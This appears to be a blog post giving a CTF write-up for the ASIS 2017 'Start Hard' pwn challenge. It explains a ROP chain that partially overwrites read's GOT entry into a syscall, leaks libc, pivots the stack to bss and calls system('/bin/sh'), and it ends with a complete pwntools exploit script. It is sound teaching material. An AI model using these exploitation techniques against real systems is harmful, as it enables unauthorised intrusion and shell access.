---
layout: post
title: Start Hard - ASIS CTF Quals 2017
date:   2017-04-10 07:58:21 +1100
categories: posts
---

> I doubt it's harder.
>
> ‍‍‍‍nc 128.199.152.175 10001

*201 Pts, 43 solved, Crypto. [start_hard_c8b452f5aab9a474dcfe1351ec077a601fdf8249][asset]*

---

This was great little challenge, all it did was read 0x400 bytes into a buffer and returned 0.

So we have a buffer overflow, NX and ASLR enable, and only only a single libc function *read*. It's ropping time!

First of all we need a way to get a leak to defeat ASLR. *write* in libc is located close enough to *read* that we could overwrite just the last byte of the GOT entry and turn it into a call to *write*. This would allow us to leak anything, but afterward we would have to way to call *read* again to do anything useful.

Another option is to overwrite *read* to point to a *syscall*, that would give us greater control over what we could do:
{% highlight python %}
Dump of assembler code for function read:
   0x00007ffff7b04670 <+0>:	cmp    DWORD PTR [rip+0x2d20c9],0x0        # 0x7ffff7dd6740 <__libc_multiple_threads>
   0x00007ffff7b04677 <+7>:	jne    0x7ffff7b04689 <read+25>
   0x00007ffff7b04679 <+0>:	mov    eax,0x0
   0x00007ffff7b0467e <+5>:	syscall{% endhighlight %}

Overwriting one byte also has the nice side effect of setting *rax* to 1 which is what we need for a write syscall.

Now we have a leak and can get the libc base address, then we need to get *rax* to 0 to perform another *read*.

As the main function in binary returns 0, we can use that:

{% highlight python %}
   0x000000000040054b:	mov    eax,0x0
   0x0000000000400550:	leave
   0x0000000000400551:	ret{% endhighlight %}

The only downside is that it will do a *leave*, so the stack will be pivoted to whatever we overflowed the saved *rbp* to be. That's no problem, we just need to set *rbp* to point to some fixed writeable location and make sure we have setup our *rop* there. We can use somewhere in the *bss* and set it up before we overwrite the *read* got.

So we setup the rop in bss to call *read* and overwrite the new stack with *system*, and set *rdi* to */bin/sh* and we have a shell.

---
Here is the final exploit:

{% highlight python %}
#!/usr/bin/env python2

from pwn import *

write_offset =  0xf667e
bss =  0x601038 + 0x400
read_got = 0x601018

pop_rdi = p64(0x00000000004005c3) # pop rdi; ret;
pop2_rsi = p64(0x00000000004005c1) #: pop rsi; pop r15; ret;
eax_0 = p64(0x000000000040054b) # mov eax, 0; leave; ret;

read = p64(0x400400)
syscall = read


def rop1():
  rop = ""

  # read in stage2 rop
  rop += pop2_rsi + p64(bss) + p64(0)
  rop += read

  # overwrite 1 byte of read_got
  rop += pop2_rsi + p64(read_got) + p64(0)
  rop += read

  # read_got is now a syscall
  # rax == 1 from 1 byte read
  # write(1, read_got, 0x400)
  rop += pop_rdi + p64(1)
  rop += syscall

  # set rax to 0 to read syscall
  rop += eax_0

  return rop

def rop2():
  rop = ""
  rop += p64(bss) #rbp

  rop += pop_rdi + p64(0)
  rop += pop2_rsi + p64(bss+0x48) + p64(0)
  rop += read

  # setup "/bin/sh" arg to system
  rop += pop_rdi + p64(bss+0x48+16)

  return rop

def exploit():

  stage1_rop = rop1()
  p.sendline("A"*16 + p64(bss) + stage1_rop)
  log.info("First rop sent")
  pause()

  stage2_rop = rop2()
  p.send(stage2_rop)
  log.info("Second rop sent")
  pause()

  # one byte override of read_got to make it a syscall
  p.send("\x7e")
  log.info("Read GOT overwritten")

  leak1 = u64(p.recvn(8))
  leak2 = u64(p.recvn(8))

  libc.address = leak1 - write_offset

  log.info("write 0x%x"%leak1)
  log.info("start 0x%x"%leak2)
  log.info("libc 0x%x"%libc.address)

  # write system and setup /bin/sh in bss
  p.send(p64(libc.symbols["system"]) + p64(0) + "/bin/sh\x00")
  p.interactive()


if __name__ == "__main__":
  name = "./start_hard"
  binary = ELF(name)

  libc_name = "/lib/x86_64-linux-gnu/libc-2.23.so"
  libc = ELF(libc_name)

  context.arch = "amd64"

  if len(sys.argv) > 1:
    p = remote("128.199.152.175", 10001)
  else:
    p = process(name, env={})

  exploit()
{% endhighlight %}

[asset]: {{ site.url }}/assets/start_hard_c8b452f5aab9a474dcfe1351ec077a601fdf8249.zip
